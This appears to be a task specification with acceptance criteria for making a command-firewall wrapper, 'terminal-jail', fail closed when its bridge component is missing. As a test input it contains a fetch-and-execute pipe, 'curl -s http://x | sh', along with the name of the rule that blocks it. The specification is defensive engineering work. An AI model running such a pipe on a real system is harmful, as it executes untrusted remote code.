task_title: Installed binary must not fail open (TJ-GAP-021)
task_criteria: install.sh local mode ships the plugin bridge tree to ${INSTALL_DIR}/../lib/terminal-jail/ (plugin/terminal_jail/interruptor_bridge.py + rules/00-builtins.yaml present) and standalone/seccomp-loader.py
The installed wrapper (invoked via PATH as bare 'terminal-jail') finds the shipped bridge and BLOCKS 'curl -s http://x | sh' with exit 126 and a COMMAND BLOCKED box naming builtin-curl-pipe-shell

A bare wrapper copied without the bridge FAILS CLOSED in enforce mode: exit 126, COMMAND BLOCKED — interruptor-bridge-unavailable, command never executes, and the old 'running without firewall' fail-open warning is gone
TERMINAL_JAIL_INTERRUPTOR_MODE=warn still allows explicit opt-out with the warning printed
TERMINAL_JAIL_BRIDGE env var overrides bridge resolution (missing file = hard failure)
SCRIPT_DIR resolves via command -v when the binary is invoked by bare name (PATH invocation) so relative resources resolve regardless of cwd
Full suite green: .venv/bin/python -m pytest -q passes, ruff check plugin/ standalone/ clean, gitreins guard 4/4 PASS
Commit includes Co-authored-by trailer and addresses TJ-GAP-021
